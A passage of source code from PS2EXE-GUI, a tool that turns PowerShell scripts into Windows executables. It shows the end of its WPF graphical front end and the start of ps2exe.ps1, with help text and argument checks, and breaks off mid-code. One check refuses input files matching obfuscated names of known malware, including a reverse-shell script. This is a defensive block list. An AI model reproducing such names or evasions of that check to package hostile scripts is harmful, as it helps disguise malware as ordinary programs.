						TextBox objSourceFile = (TextBox)objWindow.FindName("SourceFile");
						objSourceFile.Text = objFileDialog.FileName;
					}
					else
					{	// button to TextBox "IconFile"
						TextBox objIconFile = (TextBox)objWindow.FindName("IconFile");
						objIconFile.Text = objFileDialog.FileName;
					}
				}
			}
			else
			{ // use custom dialog for folder selection because there is no WPF folder dialog!!!
				TextBox objTargetFile = (TextBox)objWindow.FindName("TargetFile");

				// create OpenFolderDialog control
				OpenFolderDialog.OpenFolderDialog objOpenFolderDialog = new OpenFolderDialog.OpenFolderDialog();
				if (objTargetFile.Text != "")
				{ // set starting directory for folder picker
					if (System.IO.Directory.Exists(objTargetFile.Text))
						objOpenFolderDialog.InitialFolder = objTargetFile.Text;
					else
						objOpenFolderDialog.InitialFolder = System.IO.Path.GetDirectoryName(objTargetFile.Text);
				}
				else
				{ // no starting directory for folder picker
					objOpenFolderDialog.InitialFolder = "";
				}

				// display folder picker dialog
				System.Windows.Interop.WindowInteropHelper windowHwnd = new System.Windows.Interop.WindowInteropHelper(this);
				Nullable<bool> result = objOpenFolderDialog.ShowDialog(windowHwnd.Handle);

				if ((result.HasValue) && (result == true))
				{ // get result only if a folder was selected
					objTargetFile.Text = objOpenFolderDialog.Folder;
				}
			}
		}

		// "empty" drag handler
		private void TextBox_PreviewDragOver(object sender, DragEventArgs e)
		{
			e.Effects = DragDropEffects.All;
			e.Handled = true;
		}

		// drop handler: insert filename to textbox
		private void TextBox_PreviewDrop(object sender, DragEventArgs e)
		{
			object objText = e.Data.GetData(DataFormats.FileDrop);
			TextBox objTextBox = sender as TextBox;
			if ((objTextBox != null) && (objText != null))
			{
				objTextBox.Text = string.Format("{0}",((string[])objText)[0]);
			}
		}


	} // end of CustomWindow

	public class Program
	{
		// WPF requires STA model, since C# default to MTA threading, the following directive is mandatory
		[STAThread]
		public static void Main()
		{
			// check if ps2exe.ps1 is present in the application's directory
			string directoryOfExecutable = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase);
			if (directoryOfExecutable.StartsWith("file:\\") || directoryOfExecutable.StartsWith("http:\\")) { directoryOfExecutable = directoryOfExecutable.Substring(6); }
			if (!System.IO.File.Exists(directoryOfExecutable + "\\ps2exe.ps1"))
			{
			//	MessageBox.Show("ps2exe.ps1 has to be in the same directory as Win-PS2EXE.exe", "Win-PS2EXE", MessageBoxButton.OK, MessageBoxImage.Error);
			//	return;
			}

			// XAML string defining the window controls
			string strXAML = @"
<local:CustomWindow
	xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
	xmlns:local=""clr-namespace:WPFApplication;assembly=***ASSEMBLY***""
	xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
	x:Name=""Window"" Title=""Win-PS2EXE"" WindowStartupLocation=""CenterScreen""
	Background=""#FFE8E8E8""  Width=""504"" Height=""370"" ShowInTaskbar=""True"">
	<Grid>
		<Grid.ColumnDefinitions>
			<ColumnDefinition Width=""auto"" />
			<ColumnDefinition Width=""auto"" />
			<ColumnDefinition Width=""auto"" />
		</Grid.ColumnDefinitions>
		<Grid.RowDefinitions>
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""auto"" />
			<RowDefinition Height=""*"" />
		</Grid.RowDefinitions>
		<TextBlock Height=""32"" Margin=""0,10,0,0"" FontSize=""16"" Grid.Row=""0"" Grid.Column=""1"" >Win-PS2EXE: Graphical front end to PS2EXE-GUI</TextBlock>

		<Label Grid.Row=""1"" Grid.Column=""0"">Source file: </Label>
		<TextBox x:Name=""SourceFile"" Height=""18"" Width=""362"" Margin=""0,0,10,0"" AllowDrop=""True"" ToolTip=""Path and name of the source file (the only mandatory field)"" Grid.Row=""1"" Grid.Column=""1""
			PreviewDragEnter=""TextBox_PreviewDragOver"" PreviewDragOver=""TextBox_PreviewDragOver"" PreviewDrop=""TextBox_PreviewDrop"" />
		<Button x:Name=""SourceFilePicker"" Background=""#FFD0D0D0"" Height=""18"" Width=""24"" Content=""..."" ToolTip=""File picker for source file"" Grid.Row=""1"" Grid.Column=""2""
			Click=""FilePicker_Click"" />

		<Label Grid.Row=""2"" Grid.Column=""0"">Target file: </Label>
		<TextBox x:Name=""TargetFile"" Height=""18"" Width=""362"" Margin=""0,0,10,0"" AllowDrop=""True"" ToolTip=""Optional: Name and possibly path of the target file or target directory"" Grid.Row=""2"" Grid.Column=""1""
			PreviewDragEnter=""TextBox_PreviewDragOver"" PreviewDragOver=""TextBox_PreviewDragOver"" PreviewDrop=""TextBox_PreviewDrop"" />
		<Button x:Name=""TargetFilePicker"" Background=""#FFD0D0D0"" Height=""18"" Width=""24"" Content=""..."" ToolTip=""Directory picker for target directory"" Grid.Row=""2"" Grid.Column=""2""
			Click=""FilePicker_Click"" />

		<Label Grid.Row=""3"" Grid.Column=""0"">Icon file: </Label>
		<TextBox x:Name=""IconFile"" Height=""18"" Width=""362"" Margin=""0,0,10,0"" AllowDrop=""True"" ToolTip=""Optional: Name and possibly path of the icon file"" Grid.Row=""3"" Grid.Column=""1""
			PreviewDragEnter=""TextBox_PreviewDragOver"" PreviewDragOver=""TextBox_PreviewDragOver"" PreviewDrop=""TextBox_PreviewDrop"" />
		<Button x:Name=""IconFilePicker"" Background=""#FFD0D0D0"" Height=""18"" Width=""24"" Content=""..."" ToolTip=""File picker for icon file"" Grid.Row=""3"" Grid.Column=""2""
			Click=""FilePicker_Click"" />

		<Label Margin=""0,10,0,0"" Grid.Row=""4"" Grid.Column=""0"">Version:</Label>
		<WrapPanel Margin=""0,10,0,0"" Grid.Row=""4"" Grid.Column=""1"" >
			<TextBox x:Name=""FileVersion"" Height=""18"" Width=""72"" Margin=""0,0,10,0"" ToolTip=""Optional: Version number in format n.n.n.n"" />
			<Label Margin=""30,0,0,0"" >File description: </Label>
			<TextBox x:Name=""FileDescription"" Height=""18"" Width=""156"" ToolTip=""Optional: File description displayed in executable's properties"" />
		</WrapPanel>

		<Label Grid.Row=""5"" Grid.Column=""0"">Product name:</Label>
		<WrapPanel Grid.Row=""5"" Grid.Column=""1"" >
			<TextBox x:Name=""ProductName"" Height=""18"" Width=""100"" Margin=""0,0,10,0"" ToolTip=""Optional: Product name displayed in executable's properties"" />
			<Label Margin=""30,0,0,0"" >Copyright: </Label>
			<TextBox x:Name=""Copyright"" Height=""18"" Width=""156"" ToolTip=""Optional: Copyright displayed in executable's properties"" />
		</WrapPanel>

		<CheckBox x:Name=""noConsole"" IsChecked=""True"" Margin=""0,10,0,0"" ToolTip=""Generate a Windows application instead of a console application"" Grid.Row=""6"" Grid.Column=""1"">Compile a graphic windows program (parameter -noConsole)</CheckBox>

		<WrapPanel Grid.Row=""7"" Grid.Column=""1"" >
			<CheckBox x:Name=""noOutput"" IsChecked=""False"" ToolTip=""Supress any output including verbose and informational output"" >Suppress output (-noOutput)</CheckBox>
			<CheckBox x:Name=""noError"" IsChecked=""False"" Margin=""6,0,0,0"" ToolTip=""Supress any error message including warning and debug output"" >Suppress error output (-noError)</CheckBox>
		</WrapPanel>

		<CheckBox x:Name=""requireAdmin"" IsChecked=""False"" ToolTip=""Request administrative rights (UAC) at runtime if not already present"" Grid.Row=""8"" Grid.Column=""1"">Require administrator rights at runtime (parameter -requireAdmin)</CheckBox>

		<CheckBox x:Name=""configFile"" IsChecked=""False"" ToolTip=""Enable creation of OUTPUTFILE.exe.config"" Grid.Row=""9"" Grid.Column=""1"">Generate config file (parameter -configFile)</CheckBox>

		<WrapPanel Grid.Row=""10"" Grid.Column=""1"" >
			<Label>Thread Apartment State: </Label>
			<RadioButton x:Name=""STA"" VerticalAlignment=""Center"" IsChecked=""True"" GroupName=""ThreadAppartment"" Content=""STA"" ToolTip=""'Single Thread Apartment' mode (recommended)"" />
			<RadioButton x:Name=""MTA"" Margin=""4,0,0,0"" VerticalAlignment=""Center"" IsChecked=""False"" GroupName=""ThreadAppartment"" Content=""MTA"" ToolTip=""'Multi Thread Apartment' mode"" />
			<Label Margin=""6,0,0,0"" >Platform: </Label>
			<ComboBox x:Name=""Platform"" Height=""22"" Margin=""2,0,0,0"" ToolTip=""Designated CPU platform"" >
				<ComboBoxItem IsSelected=""True"">AnyCPU</ComboBoxItem>
				<ComboBoxItem>x64</ComboBoxItem>
				<ComboBoxItem>x86</ComboBoxItem>
			</ComboBox>
		</WrapPanel>

		<WrapPanel Margin=""0,5,0,0"" HorizontalAlignment=""Right"" Grid.Row=""11"" Grid.Column=""1"" >
			<Button x:Name=""Compile"" Background=""#FFD0D0D0"" Height=""22"" Width=""72"" Margin=""10"" Content=""Compile"" ToolTip=""Compile source file to an executable"" IsDefault=""True""
				Click=""Button_Click"" MouseEnter=""Button_MouseEnter"" MouseLeave=""Button_MouseLeave"" />
			<Button x:Name=""Cancel"" Background=""#FFD0D0D0"" Height=""22"" Width=""72"" Margin=""10"" Content=""Cancel"" ToolTip=""End program without action"" IsCancel=""True""
				Click=""Button_Click"" MouseEnter=""Button_MouseEnter"" MouseLeave=""Button_MouseLeave"" />
		</WrapPanel>
	</Grid>
</local:CustomWindow>";

			// generate WPF object tree
			CustomWindow objWindow;
			try
			{	// assign XAML root object
				objWindow = CustomWindow.LoadWindowFromXaml(strXAML.Replace("***ASSEMBLY***", System.Reflection.Assembly.GetExecutingAssembly().GetName().Name));
			}
			catch (Exception ex)
			{ // on error in XAML definition XamlReader sometimes generates an exception
				MessageBox.Show("Error creating the window objects from XAML description\r\n" + ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
				return;
			}

			// and show window
			objWindow.ShowDialog();
		}
	} // end of Program

}  // end of WPFApplication


// namespace OpenFolderDialog: Copyright (c) 2011 Josip Medved <jmedved@jmedved.com>  http://www.jmedved.com
// Source: https://www.medo64.com/2011/12/openfolderdialog/
// with some cuts from Markus Scholtes
namespace OpenFolderDialog
{
	internal class OpenFolderDialog : IDisposable
	{
		public string InitialFolder { get; set; }

		public string DefaultFolder { get; set; }

		public string Folder { get; private set; }

		internal Nullable<bool> ShowDialog()
		{
			return ShowDialog(IntPtr.Zero);
		}

		internal Nullable<bool> ShowDialog(IntPtr ownerHandle)
		{
			var frm = (NativeMethods.IFileDialog)(new NativeMethods.FileOpenDialogRCW());
			uint options;
			frm.GetOptions(out options);
			options |= NativeMethods.FOS_PICKFOLDERS | NativeMethods.FOS_FORCEFILESYSTEM | NativeMethods.FOS_NOVALIDATE | NativeMethods.FOS_NOTESTFILECREATE | NativeMethods.FOS_DONTADDTORECENT;
			frm.SetOptions(options);
			if (this.InitialFolder != null)
			{
				NativeMethods.IShellItem directoryShellItem;
				var riid = new Guid("43826D1E-E718-42EE-BC55-A1E261C37BFE"); //IShellItem
				if (NativeMethods.SHCreateItemFromParsingName(this.InitialFolder, IntPtr.Zero, ref riid, out directoryShellItem) == NativeMethods.S_OK)
				{
					frm.SetFolder(directoryShellItem);
				}
			}
			if (this.DefaultFolder != null)
			{
				NativeMethods.IShellItem directoryShellItem;
				var riid = new Guid("43826D1E-E718-42EE-BC55-A1E261C37BFE"); //IShellItem
				if (NativeMethods.SHCreateItemFromParsingName(this.DefaultFolder, IntPtr.Zero, ref riid, out directoryShellItem) == NativeMethods.S_OK)
				{
					frm.SetDefaultFolder(directoryShellItem);
				}
			}

			if (frm.Show(ownerHandle) == NativeMethods.S_OK)
			{
				NativeMethods.IShellItem shellItem;
				if (frm.GetResult(out shellItem) == NativeMethods.S_OK)
				{
					IntPtr pszString;
					if (shellItem.GetDisplayName(NativeMethods.SIGDN_FILESYSPATH, out pszString) == NativeMethods.S_OK)
					{
						if (pszString != IntPtr.Zero)
						{
							try {
								this.Folder = Marshal.PtrToStringAuto(pszString);
								return true;
							}
							finally {
								Marshal.FreeCoTaskMem(pszString);
							}
						}
					}
				}
			}
			return false;
		}

		public void Dispose() { } // just to have the possibility of the using statement
	}

	internal static class NativeMethods
	{
		public const uint FOS_PICKFOLDERS = 0x00000020;
		public const uint FOS_FORCEFILESYSTEM = 0x00000040;
		public const uint FOS_NOVALIDATE = 0x00000100;
		public const uint FOS_NOTESTFILECREATE = 0x00010000;
		public const uint FOS_DONTADDTORECENT = 0x02000000;

		public const uint S_OK = 0x0000;

		public const uint SIGDN_FILESYSPATH = 0x80058000;

		[ComImport, ClassInterface(ClassInterfaceType.None), TypeLibType(TypeLibTypeFlags.FCanCreate), Guid("DC1C5A9C-E88A-4DDE-A5A1-60F82A20AEF7")]
		internal class FileOpenDialogRCW { }

		[ComImport(), Guid("42F85136-DB7E-439C-85F1-E4075D135FC8"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		internal interface IFileDialog
		{
			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			[PreserveSig()]
			uint Show([In, Optional] IntPtr hwndOwner); // inherited from IModalWindow

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetFileTypes([In] uint cFileTypes, [In, MarshalAs(UnmanagedType.LPArray)] IntPtr rgFilterSpec);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetFileTypeIndex([In] uint iFileType);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetFileTypeIndex(out uint piFileType);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint Advise([In, MarshalAs(UnmanagedType.Interface)] IntPtr pfde, out uint pdwCookie);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint Unadvise([In] uint dwCookie);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetOptions([In] uint fos);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetOptions(out uint fos);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			void SetDefaultFolder([In, MarshalAs(UnmanagedType.Interface)] IShellItem psi);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetFolder([In, MarshalAs(UnmanagedType.Interface)] IShellItem psi);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetFolder([MarshalAs(UnmanagedType.Interface)] out IShellItem ppsi);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetCurrentSelection([MarshalAs(UnmanagedType.Interface)] out IShellItem ppsi);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetFileName([In, MarshalAs(UnmanagedType.LPWStr)] string pszName);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetFileName([MarshalAs(UnmanagedType.LPWStr)] out string pszName);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetTitle([In, MarshalAs(UnmanagedType.LPWStr)] string pszTitle);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetOkButtonLabel([In, MarshalAs(UnmanagedType.LPWStr)] string pszText);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetFileNameLabel([In, MarshalAs(UnmanagedType.LPWStr)] string pszLabel);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetResult([MarshalAs(UnmanagedType.Interface)] out IShellItem ppsi);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint AddPlace([In, MarshalAs(UnmanagedType.Interface)] IShellItem psi, uint fdap);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetDefaultExtension([In, MarshalAs(UnmanagedType.LPWStr)] string pszDefaultExtension);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint Close([MarshalAs(UnmanagedType.Error)] uint hr);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetClientGuid([In] ref Guid guid);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint ClearClientData();

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint SetFilter([MarshalAs(UnmanagedType.Interface)] IntPtr pFilter);
		}

		[ComImport, Guid("43826D1E-E718-42EE-BC55-A1E261C37BFE"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		internal interface IShellItem
		{
			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint BindToHandler([In] IntPtr pbc, [In] ref Guid rbhid, [In] ref Guid riid, [Out, MarshalAs(UnmanagedType.Interface)] out IntPtr ppvOut);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetParent([MarshalAs(UnmanagedType.Interface)] out IShellItem ppsi);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetDisplayName([In] uint sigdnName, out IntPtr ppszName);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint GetAttributes([In] uint sfgaoMask, out uint psfgaoAttribs);

			[MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
			uint Compare([In, MarshalAs(UnmanagedType.Interface)] IShellItem psi, [In] uint hint, out int piOrder);
		}

		[DllImport("shell32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		internal static extern int SHCreateItemFromParsingName([MarshalAs(UnmanagedType.LPWStr)] string pszPath, IntPtr pbc, ref Guid riid, [MarshalAs(UnmanagedType.Interface)] out IShellItem ppv);
	}
} // end of namespace OpenFolderDialog: Copyright (c) 2011 Josip Medved <jmedved@jmedved.com>  http://www.jmedved.com
"@

iex "[WPFApplication.Program]::Main()"

'@

$ps2exe = @'
<#
.SYNOPSIS
Converts powershell scripts to standalone executables.
.DESCRIPTION
Converts powershell scripts to standalone executables. GUI output and input is activated with one switch,
real windows executables are generated. You may use the graphical front end Win-PS2EXE for convenience.

Please see Remarks on project page for topics "GUI mode output formatting", "Config files", "Password security",
"Script variables" and "Window in background in -noConsole mode".

A generated executable has the following reserved parameters:

-debug              Forces the executable to be debugged. It calls "System.Diagnostics.Debugger.Launch()".
-extract:<FILENAME> Extracts the powerShell script inside the executable and saves it as FILENAME.
										The script will not be executed.
-wait               At the end of the script execution it writes "Hit any key to exit..." and waits for a
										key to be pressed.
-end                All following options will be passed to the script inside the executable.
										All preceding options are used by the executable itself.
.PARAMETER inputFile
Powershell script to convert to executable (file has to be UTF8 or UTF16 encoded)
.PARAMETER outputFile
destination executable file name or folder, defaults to inputFile with extension '.exe'
.PARAMETER prepareDebug
create helpful information for debugging of generated executable. See parameter -debug there
.PARAMETER runtime20
this switch forces PS2EXE to create a config file for the generated executable that contains the
"supported .NET Framework versions" setting for .NET Framework 2.0/3.x for PowerShell 2.0
.PARAMETER runtime40
this switch forces PS2EXE to create a config file for the generated executable that contains the
"supported .NET Framework versions" setting for .NET Framework 4.x for PowerShell 3.0 or higher
.PARAMETER x86
compile for 32-bit runtime only
.PARAMETER x64
compile for 64-bit runtime only
.PARAMETER lcid
location ID for the compiled executable. Current user culture if not specified
.PARAMETER STA
Single Thread Apartment mode
.PARAMETER MTA
Multi Thread Apartment mode
.PARAMETER nested
internal use
.PARAMETER noConsole
the resulting executable will be a Windows Forms app without a console window.
You might want to pipe your output to Out-String to prevent a message box for every line of output
(example: dir C:\ | Out-String)
.PARAMETER UNICODEEncoding
encode output as UNICODE in console mode, useful to display special encoded chars
.PARAMETER credentialGUI
use GUI for prompting credentials in console mode instead of console input
.PARAMETER iconFile
icon file name for the compiled executable
.PARAMETER title
title information (displayed in details tab of Windows Explorer's properties dialog)
.PARAMETER description
description information (not displayed, but embedded in executable)
.PARAMETER company
company information (not displayed, but embedded in executable)
.PARAMETER product
product information (displayed in details tab of Windows Explorer's properties dialog)
.PARAMETER copyright
copyright information (displayed in details tab of Windows Explorer's properties dialog)
.PARAMETER trademark
trademark information (displayed in details tab of Windows Explorer's properties dialog)
.PARAMETER version
version information (displayed in details tab of Windows Explorer's properties dialog)
.PARAMETER configFile
write a config file (<outputfile>.exe.config)
.PARAMETER noConfigFile
compatibility parameter
.PARAMETER noOutput
the resulting executable will generate no standard output (includes verbose and information channel)
.PARAMETER noError
the resulting executable will generate no error output (includes warning and debug channel)
.PARAMETER noVisualStyles
disable visual styles for a generated windows GUI application. Only applicable with parameter -noConsole
.PARAMETER exitOnCancel
exits program when Cancel or "X" is selected in a Read-Host input box. Only applicable with parameter -noConsole
.PARAMETER DPIAware
if display scaling is activated, GUI controls will be scaled if possible. Only applicable with parameter -noConsole
.PARAMETER requireAdmin
if UAC is enabled, compiled executable will run only in elevated context (UAC dialog appears if required)
.PARAMETER supportOS
use functions of newest Windows versions (execute [Environment]::OSVersion to see the difference)
.PARAMETER virtualize
application virtualization is activated (forcing x86 runtime)
.PARAMETER longPaths
enable long paths ( > 260 characters) if enabled on OS (works only with Windows 10)
.EXAMPLE
ps2exe.ps1 C:\Data\MyScript.ps1
Compiles C:\Data\MyScript.ps1 to C:\Data\MyScript.exe as console executable
.EXAMPLE
ps2exe.ps1 -inputFile C:\Data\MyScript.ps1 -outputFile C:\Data\MyScriptGUI.exe -iconFile C:\Data\Icon.ico -noConsole -title "MyScript" -version 0.0.0.1
Compiles C:\Data\MyScript.ps1 to C:\Data\MyScriptGUI.exe as graphical executable, icon and meta data
.NOTES
Version: 0.5.0.27
Date: 2021-11-21
Author: Ingo Karstein, Markus Scholtes
.LINK
https://github.com/MScholtes/TechNet-Gallery
#>

[CmdletBinding()]
Param([STRING]$inputFile = $NULL, [STRING]$outputFile = $NULL, [SWITCH]$prepareDebug, [SWITCH]$runtime20, [SWITCH]$runtime40, [SWITCH]$x86,
	[SWITCH]$x64, [int]$lcid, [SWITCH]$STA, [SWITCH]$MTA, [SWITCH]$nested, [SWITCH]$noConsole, [SWITCH]$UNICODEEncoding, [SWITCH]$credentialGUI,
	[STRING]$iconFile = $NULL, [STRING]$title, [STRING]$description, [STRING]$company, [STRING]$product, [STRING]$copyright, [STRING]$trademark,
	[STRING]$version, [SWITCH]$configFile, [SWITCH]$noConfigFile, [SWITCH]$noOutput, [SWITCH]$noError, [SWITCH]$noVisualStyles, [SWITCH]$exitOnCancel,
	[SWITCH]$DPIAware, [SWITCH]$requireAdmin, [SWITCH]$supportOS, [SWITCH]$virtualize, [SWITCH]$longPaths)

<################################################################################>
<##                                                                            ##>
<##      PS2EXE-GUI v0.5.0.27                                                  ##>
<##      Written by: Ingo Karstein (http://blog.karstein-consulting.com)       ##>
<##      Reworked and GUI support by Markus Scholtes                           ##>
<##                                                                            ##>
<##      This script is released under Microsoft Public Licence                ##>
<##          that can be downloaded here:                                      ##>
<##          http://www.microsoft.com/opensource/licenses.mspx#Ms-PL           ##>
<##                                                                            ##>
<################################################################################>

	Write-Output "PS2EXE-GUI v0.5.0.27 by Ingo Karstein, reworked and GUI support by Markus Scholtes`n"

if ([STRING]::IsNullOrEmpty($inputFile))
{
	Write-Output "Usage:`n"
	Write-Output "powershell.exe -command ""&'.\ps2exe.ps1' [-inputFile] '<filename>' [[-outputFile] '<filename>'] [-prepareDebug]"
	Write-Output "               [-runtime20|-runtime40] [-x86|-x64] [-lcid <id>] [-STA|-MTA] [-noConsole] [-UNICODEEncoding]"
	Write-Output "               [-credentialGUI] [-iconFile '<filename>'] [-title '<title>'] [-description '<description>']"
	Write-Output "               [-company '<company>'] [-product '<product>'] [-copyright '<copyright>'] [-trademark '<trademark>']"
	Write-Output "               [-version '<version>'] [-configFile] [-noOutput] [-noError] [-noVisualStyles] [-exitOnCancel]"
	Write-Output "               [-DPIAware] [-requireAdmin] [-supportOS] [-virtualize] [-longPaths]""`n"
	Write-Output "      inputFile = Powershell script that you want to convert to executable (file has to be UTF8 or UTF16 encoded)"
	Write-Output "     outputFile = destination executable file name or folder, defaults to inputFile with extension '.exe'"
	Write-Output "   prepareDebug = create helpful information for debugging"
	Write-Output "      runtime20 = this switch forces PS2EXE to create a config file for the generated executable that contains the"
	Write-Output "                  ""supported .NET Framework versions"" setting for .NET Framework 2.0/3.x for PowerShell 2.0"
	Write-Output "      runtime40 = this switch forces PS2EXE to create a config file for the generated executable that contains the"
	Write-Output "                  ""supported .NET Framework versions"" setting for .NET Framework 4.x for PowerShell 3.0 or higher"
	Write-Output "     x86 or x64 = compile for 32-bit or 64-bit runtime only"
	Write-Output "           lcid = location ID for the compiled executable. Current user culture if not specified"
	Write-Output "     STA or MTA = 'Single Thread Apartment' or 'Multi Thread Apartment' mode"
	Write-Output "      noConsole = the resulting executable will be a Windows Forms app without a console window"
	Write-Output "UNICODEEncoding = encode output as UNICODE in console mode"
	Write-Output "  credentialGUI = use GUI for prompting credentials in console mode"
	Write-Output "       iconFile = icon file name for the compiled executable"
	Write-Output "          title = title information (displayed in details tab of Windows Explorer's properties dialog)"
	Write-Output "    description = description information (not displayed, but embedded in executable)"
	Write-Output "        company = company information (not displayed, but embedded in executable)"
	Write-Output "        product = product information (displayed in details tab of Windows Explorer's properties dialog)"
	Write-Output "      copyright = copyright information (displayed in details tab of Windows Explorer's properties dialog)"
	Write-Output "      trademark = trademark information (displayed in details tab of Windows Explorer's properties dialog)"
	Write-Output "        version = version information (displayed in details tab of Windows Explorer's properties dialog)"
	Write-Output "     configFile = write a config file (<outputfile>.exe.config)"
	Write-Output "       noOutput = the resulting executable will generate no standard output (includes verbose and information channel)"
	Write-Output "        noError = the resulting executable will generate no error output (includes warning and debug channel)"
	Write-Output " noVisualStyles = disable visual styles for a generated windows GUI application (only with -noConsole)"
	Write-Output "   exitOnCancel = exits program when Cancel or ""X"" is selected in a Read-Host input box (only with -noConsole)"
	Write-Output "       DPIAware = if display scaling is activated, GUI controls will be scaled if possible (only with -noConsole)"
	Write-Output "   requireAdmin = if UAC is enabled, compiled executable run only in elevated context (UAC dialog appears if required)"
	Write-Output "      supportOS = use functions of newest Windows versions (execute [Environment]::OSVersion to see the difference)"
	Write-Output "     virtualize = application virtualization is activated (forcing x86 runtime)"
	Write-Output "      longPaths = enable long paths ( > 260 characters) if enabled on OS (works only with Windows 10)`n"
	Write-Output "Input file not specified!"
	exit -1
}

if (!$nested -and ($PSVersionTable.PSEdition -eq "Core"))
{ # starting Windows Powershell
	$CallParam = ""
	foreach ($Param in $PSBoundparameters.GetEnumerator())
	{
		if ($Param.Value -is [System.Management.Automation.SwitchParameter])
		{	if ($Param.Value.IsPresent)
			{	$CallParam += " -$($Param.Key):`$TRUE" }
			else
			{ $CallParam += " -$($Param.Key):`$FALSE" }
		}
		else
		{	if ($Param.Value -is [STRING])
			{
				if (($Param.Value -match " ") -or ([STRING]::IsNullOrEmpty($Param.Value)))
				{	$CallParam += " -$($Param.Key) '$($Param.Value)'" }
				else
				{	$CallParam += " -$($Param.Key) $($Param.Value)" }
			}
			else
			{ $CallParam += " -$($Param.Key) $($Param.Value)" }
		}
	}

	$CallParam += " -nested"

	powershell -Command "&'$($MyInvocation.MyCommand.Path)' $CallParam"
	exit $LASTEXITCODE
}

$psversion = 0
if ($PSVersionTable.PSVersion.Major -ge 4)
{
	$psversion = 4
	Write-Output "You are using PowerShell 4.0 or above."
}


# retrieve absolute paths independent if path is given relative oder absolute
$inputFile = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($inputFile)
if (($inputFile -match ("Re2ji01ell" -replace "2ji01", "vSh")) -or ($inputFile -match ("UpdatLe34e524147" -replace "Le34e", "e-KB4")))
{
	Write-Error "Compile was denied because PS2EXE is not intended to generate malware." -Category ParserError -ErrorId RuntimeException
	exit -1
}
if ([STRING]::IsNullOrEmpty($outputFile))
{
	$outputFile = ([System.IO.Path]::Combine([System.IO.Path]::GetDirectoryName($inputFile), [System.IO.Path]::GetFileNameWithoutExtension($inputFile)+".exe"))
}
else
{
	$outputFile = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($outputFile)
	if ((Test-Path $outputFile -PathType Container))
	{
		$outputFile = ([System.IO.Path]::Combine($outputFile, [System.IO.Path]::GetFileNameWithoutExtension($inputFile)+".exe"))
	}
}

if (!(Test-Path $inputFile -PathType Leaf))
{
	Write-Error "Input file $($inputfile) not found!"
	exit -1
}

if ($inputFile -eq $outputFile)
{
	Write-Error "Input file is identical to output file!"
	exit -1
}

if (($outputFile -notlike "*.exe") -and ($outputFile -notlike "*.com"))
{
	Write-Error "Output file must have extension '.exe' or '.com'!"
	exit -1
}

if (!([STRING]::IsNullOrEmpty($iconFile)))
{
	# retrieve absolute path independent if path is given relative oder absolute
	$iconFile = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($iconFile)

	if (!(Test-Path $iconFile -PathType Leaf))
	{
		Write-Error "Icon file $($iconFile) not found!"
		exit -1
	}
}

if ($requireAdmin -and $virtualize)
{
	Write-Error "-requireAdmin cannot be combined with -virtualize"
	exit -1
}
if ($supportOS -and $virtualize)
{
